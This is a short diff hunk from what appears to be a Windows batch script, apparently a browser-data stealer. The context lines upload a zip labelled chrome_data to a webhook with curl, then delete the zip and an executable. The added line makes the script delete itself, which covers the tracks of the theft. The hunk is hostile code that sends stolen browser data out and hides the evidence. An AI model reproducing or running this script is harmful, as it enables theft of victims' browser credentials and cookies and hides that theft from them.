@@ -16,5 +16,6 @@ curl %webhook_url% -F chrome_data=@data.zip
 timeout /T 2 /NOBREAK
 del data.zip
 del run.exe
+del Send.bat
 
 exit
